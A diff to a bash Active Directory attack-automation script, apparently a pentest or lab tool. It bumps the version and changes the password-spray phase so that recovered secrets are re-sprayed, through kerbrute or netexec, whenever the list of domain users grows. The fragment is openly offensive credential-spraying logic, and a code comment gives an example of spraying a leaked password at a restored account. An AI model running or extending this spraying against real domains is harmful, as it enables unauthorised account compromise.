@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.4.1"
+readonly VERSION="1.4.2"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -1747,16 +1747,20 @@ phase_password_spray() {
     [[ ! -s "$OUTDIR/users_all.txt" ]] && return
     # need a spray method: kerbrute, or netexec over SMB
     { ! _kerbrute_ok && [[ "$CAP_SMB" != "1" ]]; } && return
-    local pw new=0
-    for pw in "${!FOUND_SECRETS[@]}"; do [[ -z "${SPRAYED[$pw]:-}" ]] && new=1; done
+    # Dedup key includes the user-list size: when the list GROWS (restored /
+    # re-enabled / newly-discovered accounts), every known secret is re-sprayed
+    # against the larger set — so a password recovered before a user existed
+    # still lands on it (e.g. restore todd.wolfe → spray its leaked password).
+    local pw new=0 ucount; ucount=$(grep -c . "$OUTDIR/users_all.txt")
+    for pw in "${!FOUND_SECRETS[@]}"; do [[ -z "${SPRAYED[${pw}@@${ucount}]:-}" ]] && new=1; done
 
     # 1) Spray recovered secrets (low risk: 1 attempt/user per password)
     if [[ "$new" == "1" ]]; then
         section "PASSWORD SPRAY · recovered secrets × all users"
         for pw in "${!FOUND_SECRETS[@]}"; do
-            [[ -n "${SPRAYED[$pw]:-}" ]] && continue
-            SPRAYED["$pw"]=1
-            subsection "Spraying a recovered password against $(wc -l <"$OUTDIR/users_all.txt") users ($(_kerbrute_ok && echo kerbrute || echo netexec))"
+            [[ -n "${SPRAYED[${pw}@@${ucount}]:-}" ]] && continue
+            SPRAYED["${pw}@@${ucount}"]=1
+            subsection "Spraying a recovered password against ${ucount} users ($(_kerbrute_ok && echo kerbrute || echo netexec))"
             run "spray '<secret>' × users_all.txt"
             _spray_one "$pw"
         done
